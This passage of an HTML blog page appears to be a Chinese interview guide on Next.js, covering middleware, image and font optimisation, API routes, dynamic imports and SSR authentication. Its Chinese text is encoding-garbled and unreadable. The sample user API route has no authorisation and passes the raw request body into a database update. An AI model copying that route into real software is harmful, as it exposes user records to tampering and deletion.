class="hljs-string">&#x27;Error revalidating&#x27;</span>);<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// å†…å®¹æ›´æ–°åè°ƒç”¨</span><br><span class="hljs-comment">// POST /api/revalidate?secret=&lt;token&gt;&amp;slug=new-post</span><br></code></pre></td></tr></table></figure><h3 id="Next-js-é«˜çº§ç‰¹æ€§"><a href="#Next-js-é«˜çº§ç‰¹æ€§" class="headerlink" title="Next.js é«˜çº§ç‰¹æ€§"></a>Next.js é«˜çº§ç‰¹æ€§</h3><p><strong>ä¸­é—´ä»¶</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// middleware.js</span><br><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">NextResponse</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;next/server&#x27;</span>;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">middleware</span>(<span class="hljs-params">request</span>) &#123;<br>  <span class="hljs-comment">// é‡å®šå‘æ—§è·¯å¾„</span><br>  <span class="hljs-keyword">if</span> (request.<span class="hljs-property">nextUrl</span>.<span class="hljs-property">pathname</span>.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">&#x27;/old-blog&#x27;</span>)) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">NextResponse</span>.<span class="hljs-title function_">redirect</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(<span class="hljs-string">&#x27;/blog&#x27;</span>, request.<span class="hljs-property">url</span>));<br>  &#125;<br>  <br>  <span class="hljs-comment">// è·¯å¾„é‡å†™</span><br>  <span class="hljs-keyword">if</span> (request.<span class="hljs-property">nextUrl</span>.<span class="hljs-property">pathname</span> === <span class="hljs-string">&#x27;/dashboard&#x27;</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">NextResponse</span>.<span class="hljs-title function_">rewrite</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(<span class="hljs-string">&#x27;/internal-dashboard&#x27;</span>, request.<span class="hljs-property">url</span>));<br>  &#125;<br>  <br>  <span class="hljs-comment">// èº«ä»½éªŒè¯æ£€æŸ¥</span><br>  <span class="hljs-keyword">const</span> token = request.<span class="hljs-property">cookies</span>.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;authToken&#x27;</span>);<br>  <span class="hljs-keyword">if</span> (!token &amp;&amp; request.<span class="hljs-property">nextUrl</span>.<span class="hljs-property">pathname</span>.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">&#x27;/protected&#x27;</span>)) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">NextResponse</span>.<span class="hljs-title function_">redirect</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(<span class="hljs-string">&#x27;/login&#x27;</span>, request.<span class="hljs-property">url</span>));<br>  &#125;<br>  <br>  <span class="hljs-keyword">return</span> <span class="hljs-title class_">NextResponse</span>.<span class="hljs-title function_">next</span>();<br>&#125;<br><br><span class="hljs-comment">// é…ç½®åŒ¹é…è·¯å¾„</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> config = &#123;<br>  <span class="hljs-attr">matcher</span>: [<span class="hljs-string">&#x27;/dashboard/:path*&#x27;</span>, <span class="hljs-string">&#x27;/protected/:path*&#x27;</span>, <span class="hljs-string">&#x27;/old-blog/:path*&#x27;</span>]<br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>å›¾åƒä¼˜åŒ–</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">Image</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;next/image&#x27;</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">ProductImage</span>(<span class="hljs-params">&#123; src, alt &#125;</span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Image</span></span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">src</span>=<span class="hljs-string">&#123;src&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">alt</span>=<span class="hljs-string">&#123;alt&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">width</span>=<span class="hljs-string">&#123;800&#125;</span>  // <span class="hljs-attr">æœ€å¤§æ˜¾ç¤ºå®½åº¦</span></span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">height</span>=<span class="hljs-string">&#123;600&#125;</span> // <span class="hljs-attr">æœ€å¤§æ˜¾ç¤ºé«˜åº¦</span></span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;blur&quot;</span> // <span class="hljs-attr">åŠ è½½å ä½ç¬¦</span></span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">blurDataURL</span>=<span class="hljs-string">&quot;data:image/svg+xml;base64,...&quot;</span> // <span class="hljs-attr">ä½è´¨é‡å ä½å›¾</span></span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">quality</span>=<span class="hljs-string">&#123;85&#125;</span> // <span class="hljs-attr">å›¾åƒè´¨é‡</span> (<span class="hljs-attr">1-100</span>)</span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">priority</span> // <span class="hljs-attr">å…³é”®å›¾åƒä¼˜å…ˆåŠ è½½</span></span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">sizes</span>=<span class="hljs-string">&quot;(max-width: 768px) 100vw, 50vw&quot;</span> // <span class="hljs-attr">å“åº”å¼å°ºå¯¸</span></span></span><br><span class="hljs-tag"><span class="language-xml">    /&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>API è·¯ç”±</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// pages/api/user/[id].js</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">handler</span>(<span class="hljs-params">req, res</span>) &#123;<br>  <span class="hljs-keyword">const</span> &#123; id &#125; = req.<span class="hljs-property">query</span>;<br>  <br>  <span class="hljs-keyword">switch</span> (req.<span class="hljs-property">method</span>) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;GET&#x27;</span>:<br>      <span class="hljs-keyword">const</span> user = <span class="hljs-keyword">await</span> db.<span class="hljs-property">user</span>.<span class="hljs-title function_">findUnique</span>(&#123; <span class="hljs-attr">where</span>: &#123; id &#125; &#125;);<br>      <span class="hljs-keyword">if</span> (!user) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">404</span>).<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">error</span>: <span class="hljs-string">&#x27;User not found&#x27;</span> &#125;);<br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">200</span>).<span class="hljs-title function_">json</span>(user);<br>    <br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;PUT&#x27;</span>:<br>      <span class="hljs-keyword">const</span> updatedUser = <span class="hljs-keyword">await</span> db.<span class="hljs-property">user</span>.<span class="hljs-title function_">update</span>(&#123;<br>        <span class="hljs-attr">where</span>: &#123; id &#125;,<br>        <span class="hljs-attr">data</span>: req.<span class="hljs-property">body</span><br>      &#125;);<br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">200</span>).<span class="hljs-title function_">json</span>(updatedUser);<br>    <br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;DELETE&#x27;</span>:<br>      <span class="hljs-keyword">await</span> db.<span class="hljs-property">user</span>.<span class="hljs-title function_">delete</span>(&#123; <span class="hljs-attr">where</span>: &#123; id &#125; &#125;);<br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">204</span>).<span class="hljs-title function_">end</span>();<br>    <br>    <span class="hljs-attr">default</span>:<br>      res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">&#x27;Allow&#x27;</span>, [<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;PUT&#x27;</span>, <span class="hljs-string">&#x27;DELETE&#x27;</span>]);<br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">405</span>).<span class="hljs-title function_">end</span>(<span class="hljs-string">`Method <span class="hljs-subst">$&#123;req.method&#125;</span> Not Allowed`</span>);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="æ€§èƒ½ä¼˜åŒ–å®è·µ-1"><a href="#æ€§èƒ½ä¼˜åŒ–å®è·µ-1" class="headerlink" title="æ€§èƒ½ä¼˜åŒ–å®è·µ"></a>æ€§èƒ½ä¼˜åŒ–å®è·µ</h3><p><strong>ä»£ç åˆ†å‰²ä¸åŠ¨æ€å¯¼å…¥</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">import</span> dynamic <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;next/dynamic&#x27;</span>;<br><br><span class="hljs-comment">// åŠ¨æ€åŠ è½½é‡ç»„ä»¶ï¼ˆç¦ç”¨ SSRï¼‰</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">HeavyChart</span> = <span class="hljs-title function_">dynamic</span>(<br>  <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;../components/HeavyChart&#x27;</span>),<br>  &#123; <span class="hljs-attr">ssr</span>: <span class="hljs-literal">false</span> &#125;<br>);<br><br><span class="hljs-comment">// å¸¦åŠ è½½çŠ¶æ€</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">MapComponent</span> = <span class="hljs-title function_">dynamic</span>(<br>  <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;../components/Map&#x27;</span>),<br>  &#123; <br>    <span class="hljs-attr">loading</span>: <span class="hljs-function">() =&gt;</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>Loading map...<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>,<br>    <span class="hljs-attr">ssr</span>: <span class="hljs-literal">false</span><br>  &#125;<br>);<br><br><span class="hljs-comment">// é¢„åŠ è½½å…³é”®ç»„ä»¶</span><br><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;../components/CriticalComponent&#x27;</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">module</span> =&gt;</span> &#123;<br>    <span class="hljs-comment">// ç»„ä»¶å·²åŠ è½½</span><br>  &#125;);<br>&#125;, []);<br></code></pre></td></tr></table></figure><p><strong>å­—ä½“ä¼˜åŒ–</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// _document.js</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">Document</span>, &#123; <span class="hljs-title class_">Html</span>, <span class="hljs-title class_">Head</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;next/document&#x27;</span>;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyDocument</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Document</span> &#123;<br>  <span class="hljs-title function_">render</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> (<br>      <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Html</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">Head</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">link</span></span></span><br><span class="hljs-tag"><span class="language-xml">            <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;preload&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">            <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/fonts/Inter.woff2&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">            <span class="hljs-attr">as</span>=<span class="hljs-string">&quot;font&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">            <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;font/woff2&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">            <span class="hljs-attr">crossOrigin</span>=<span class="hljs-string">&quot;anonymous&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">          /&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">Head</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">Main</span> /&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">NextScript</span> /&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">Html</span>&gt;</span></span><br>    );<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// å…¨å±€ CSS ä¸­ä½¿ç”¨</span><br>@font-face &#123;<br>  font-<span class="hljs-attr">family</span>: <span class="hljs-string">&#x27;Inter&#x27;</span>;<br>  <span class="hljs-attr">src</span>: <span class="hljs-title function_">url</span>(<span class="hljs-string">&#x27;/fonts/Inter.woff2&#x27;</span>) <span class="hljs-title function_">format</span>(<span class="hljs-string">&#x27;woff2&#x27;</span>);<br>  font-<span class="hljs-attr">weight</span>: <span class="hljs-number">100</span> <span class="hljs-number">900</span>;<br>  font-<span class="hljs-attr">display</span>: swap;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>åˆ†æå·¥å…·é›†æˆ</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// next.config.js</span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">experimental</span>: &#123;<br>    <span class="hljs-attr">instrumentationHook</span>: <span class="hljs-literal">true</span>,<br>  &#125;,<br>&#125;;<br><br><span class="hljs-comment">// instrumentation.js</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">register</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">if</span> (process.<span class="hljs-property">env</span>.<span class="hljs-property">NODE_ENV</span> === <span class="hljs-string">&#x27;production&#x27;</span>) &#123;<br>    <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;@vercel/analytics&#x27;</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">&#123; inject &#125;</span>) =&gt;</span> &#123;<br>      <span class="hljs-title function_">inject</span>();<br>    &#125;);<br>    <br>    <span class="hljs-keyword">const</span> &#123; init &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;@sentry/nextjs&#x27;</span>);<br>    <span class="hljs-title function_">init</span>(&#123;<br>      <span class="hljs-attr">dsn</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">SENTRY_DSN</span>,<br>      <span class="hljs-attr">tracesSampleRate</span>: <span class="hljs-number">0.1</span>,<br>    &#125;);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="é¢è¯•é«˜é¢‘é—®é¢˜"><a href="#é¢è¯•é«˜é¢‘é—®é¢˜" class="headerlink" title="é¢è¯•é«˜é¢‘é—®é¢˜"></a>é¢è¯•é«˜é¢‘é—®é¢˜</h3><p><strong>Qï¼šSSR ä¸ CSR å¦‚ä½•é€‰æ‹©ï¼Ÿ</strong></p><ul><li>é€‰æ‹© SSR å½“ï¼š<ul><li>SEO æ˜¯å…³é”®éœ€æ±‚ï¼ˆå†…å®¹å‹ç½‘ç«™ï¼‰</li><li>é¦–å±æ€§èƒ½è‡³å…³é‡è¦</li><li>ç¤¾äº¤åª’ä½“åˆ†äº«éœ€è¦æ­£ç¡®é¢„è§ˆ</li></ul></li><li>é€‰æ‹© CSR å½“ï¼š<ul><li>åº”ç”¨æ˜¯è®¤è¯åä½¿ç”¨ï¼ˆåå°ç³»ç»Ÿï¼‰</li><li>é«˜åº¦äº¤äº’å¼åº”ç”¨ï¼ˆå¦‚ Figmaï¼‰</li><li>å¯¹æœåŠ¡å™¨æˆæœ¬æ•æ„Ÿ</li></ul></li></ul><p><strong>Qï¼šgetStaticProps vs getServerSideProps</strong></p><p>å¯¹æ¯”ï¼š</p><table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">getStaticProps</th><th align="left">getServerSideProps</th></tr></thead><tbody><tr><td align="left">è¿è¡Œæ—¶æœº</td><td align="left">æ„å»ºæ—¶</td><td align="left">æ¯æ¬¡è¯·æ±‚æ—¶</td></tr><tr><td align="left">æ•°æ®æ–°é²œåº¦</td><td align="left">é™æ€ï¼ˆå¯é‡æ–°éªŒè¯ï¼‰</td><td align="left">å®æ—¶åŠ¨æ€</td></tr><tr><td align="left">æ€§èƒ½</td><td align="left">æå¿«ï¼ˆCDN ç¼“å­˜ï¼‰</td><td align="left">è¾ƒæ…¢ï¼ˆæœåŠ¡å™¨å¤„ç†ï¼‰</td></tr><tr><td align="left">SEO</td><td align="left">ä¼˜</td><td align="left">ä¼˜</td></tr><tr><td align="left">ä½¿ç”¨åœºæ™¯</td><td align="left">åšå®¢ã€äº§å“ç›®å½•</td><td align="left">ä¸ªæ€§åŒ–é¡µé¢ã€ä»ªè¡¨ç›˜</td></tr></tbody></table><p><strong>Qï¼šå¦‚ä½•å¤„ç† SSR ä¸­çš„èº«ä»½è®¤è¯ï¼Ÿ</strong></p><p>è§£å†³æ–¹æ¡ˆï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ä½¿ç”¨ getServerSideProps ä¼ é€’ç”¨æˆ·æ•°æ®</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getServerSideProps</span>(<span class="hljs-params">context</span>) &#123;<br>  <span class="hljs-keyword">const</span> session = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getSession</span>(context);<br>  <br>  <span class="hljs-keyword">if</span> (!session) &#123;<br>    <span class="hljs-keyword">return</span> &#123;<br>      <span class="hljs-attr">redirect</span>: &#123; <span class="hljs-attr">destination</span>: <span class="hljs-string">&#x27;/login&#x27;</span>, <span class="hljs-attr">permanent</span>: <span class="hljs-literal">false</span> &#125;<br>    &#125;;<br>  &#125;<br>  <br>  <span class="hljs-keyword">return</span> &#123;<br>    <span class="hljs-attr">props</span>: &#123; <span class="hljs-attr">user</span>: session.<span class="hljs-property">user</span> &#125;<br>  &#125;;<br>&#125;<br><br><span class="hljs-comment">// å®¢æˆ·ç«¯ä½¿ç”¨å…±äº«çŠ¶æ€</span><br><span class="hljs-keyword">import</span> &#123; useSession &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;next-auth/react&#x27;</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Profile</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> &#123; <span class="hljs-attr">data</span>: session &#125; = <span class="hljs-title function_">useSession</span>();<br>  <br>  <span class="hljs-keyword">if</span> (session) &#123;<br>    <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Welcome &#123;session.user.name&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span>;<br>  &#125;<br>  <br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Please sign in<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>Qï¼šå¦‚ä½•ä¼˜åŒ–å¤§å‹ Next.js åº”ç”¨æ€§èƒ½ï¼Ÿ</strong></p><p>ä¼˜åŒ–ç­–ç•¥ï¼š</p><ul><li>ä»£ç åˆ†å‰²ï¼šä½¿ç”¨åŠ¨æ€å¯¼å…¥æ‹†åˆ†ä»£ç </li><li>å›¾åƒä¼˜åŒ–ï¼šä½¿ç”¨ Next Image ç»„ä»¶</li><li>CDN ç¼“å­˜ï¼šé…ç½®é™æ€èµ„æºå’Œ ISR é¡µé¢ç¼“å­˜</li><li>æ•°æ®åº“ä¼˜åŒ–ï¼šä½¿ç”¨ç¼“å­˜å±‚ï¼ˆRedis&#x2F;Memcachedï¼‰</li><li>å‡å°‘ Bundle å¤§å°ï¼šåˆ†æå¹¶ä¼˜åŒ–ä¾èµ–</li><li>æœåŠ¡ç«¯ç¼“å­˜ï¼šå¯¹ SSR ç»“æœè¿›è¡ŒçŸ­æœŸç¼“å­˜</li><li>è¾¹ç¼˜è®¡ç®—ï¼šä½¿ç”¨ Edge Functions å¤„ç†è¯·æ±‚</li></ul><h3 id="æ€»ç»“-7"><a href="#æ€»ç»“-7" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><ul><li>SSR æ ¸å¿ƒä»·å€¼ï¼š<ul><li>æå‡ SEO å’Œé¦–å±æ€§èƒ½</li><li>æ”¹å–„ç¤¾äº¤åˆ†äº«ä½“éªŒ</li><li>æ”¯æŒä½ç«¯è®¾å¤‡ç”¨æˆ·</li></ul></li><li>Next.js æ ¸å¿ƒèƒ½åŠ›ï¼š<ul><li>æ–‡ä»¶ç³»ç»Ÿè·¯ç”±</li><li>æ··åˆæ¸²æŸ“ç­–ç•¥ï¼ˆSSG&#x2F;SSR&#x2F;ISRï¼‰</li><li>å†…ç½®å›¾åƒä¼˜åŒ–</li><li>API è·¯ç”±æ”¯æŒ</li></ul></li><li>å…³é”®æ•°æ®è·å–æ–¹æ³•ï¼š<ul><li>getStaticPropsï¼šæ„å»ºæ—¶è·å–æ•°æ®</li><li>getServerSidePropsï¼šè¯·æ±‚æ—¶è·å–æ•°æ®</li><li>getStaticPathsï¼šå®šä¹‰åŠ¨æ€è·¯ç”±</li></ul></li><li>é«˜çº§ç‰¹æ€§ï¼š<ul><li>ä¸­é—´ä»¶ï¼šè¯·æ±‚å¤„ç†ç®¡é“</li><li>æŒ‰éœ€é‡æ–°éªŒè¯ï¼šå†…å®¹æ›´æ–°ååˆ·æ–°</li><li>åˆ†æå·¥å…·ï¼šæ€§èƒ½ç›‘æ§</li></ul></li><li>é¢è¯•é‡ç‚¹ï¼š<ul><li>æ¸²æŸ“ç­–ç•¥é€‰æ‹©ä¾æ®</li><li>èº«ä»½è®¤è¯å®ç°æ–¹æ¡ˆ</li><li>æ€§èƒ½ä¼˜åŒ–æ‰‹æ®µ</li><li>éƒ¨ç½²æ¶æ„è®¾è®¡</li></ul></li></ul><h1 id="ç¬¬ä¸ƒç« ï¼šReact-å·¥ç¨‹åŒ–ä¸ä¼˜åŒ–"><a href="#ç¬¬ä¸ƒç« ï¼šReact-å·¥ç¨‹åŒ–ä¸ä¼˜åŒ–" class="headerlink" title="ç¬¬ä¸ƒç« ï¼šReact å·¥ç¨‹åŒ–ä¸ä¼˜åŒ–"></a>ç¬¬ä¸ƒç« ï¼šReact å·¥ç¨‹åŒ–ä¸ä¼˜åŒ–</h1><h2 id="7-1-ç»„ä»¶è®¾è®¡æ¨¡å¼ï¼ˆå¤åˆç»„ä»¶ã€å—æ§ç»„ä»¶æ¨¡å¼ï¼‰"><a href="#7-1-ç»„ä»¶è®¾è®¡æ¨¡å¼ï¼ˆå¤åˆç»„ä»¶ã€å—æ§ç»„ä»¶æ¨¡å¼ï¼‰" class="headerlink" title="7.1 ç»„ä»¶è®¾è®¡æ¨¡å¼ï¼ˆå¤åˆç»„ä»¶ã€å—æ§ç»„ä»¶æ¨¡å¼ï¼‰"></a>7.1 ç»„ä»¶è®¾è®¡æ¨¡å¼ï¼ˆå¤åˆç»„ä»¶ã€å—æ§ç»„ä»¶æ¨¡å¼ï¼‰</h2><h2 id="7-2-æ ·å¼æ–¹æ¡ˆï¼ˆCSS-Modulesã€Styled-Componentsã€Tailwind-CSSï¼‰"><a href="#7-2-æ ·å¼æ–¹æ¡ˆï¼ˆCSS-Modulesã€Styled-Componentsã€Tailwind-CSSï¼‰" class="headerlink" title="7.2 æ ·å¼æ–¹æ¡ˆï¼ˆCSS Modulesã€Styled Componentsã€Tailwind CSSï¼‰"></a>7.2 æ ·å¼æ–¹æ¡ˆï¼ˆCSS Modulesã€Styled Componentsã€Tailwind CSSï¼‰</h2><h2 id="7-3-æµ‹è¯•ï¼ˆJest-React-Testing-Libraryï¼‰"><a href="#7-3-æµ‹è¯•ï¼ˆJest-React-Testing-Libraryï¼‰" class="headerlink" title="7.3 æµ‹è¯•ï¼ˆJest + React Testing Libraryï¼‰"></a>7.3 æµ‹è¯•ï¼ˆJest + React Testing Libraryï¼‰</h2><h2 id="7-4-æ€§èƒ½ä¼˜åŒ–ï¼ˆReact-Profilerã€å‡å°‘é‡æ¸²æŸ“ï¼‰"><a href="#7-4-æ€§èƒ½ä¼˜åŒ–ï¼ˆReact-Profilerã€å‡å°‘é‡æ¸²æŸ“ï¼‰" class="headerlink" title="7.4 æ€§èƒ½ä¼˜åŒ–ï¼ˆReact 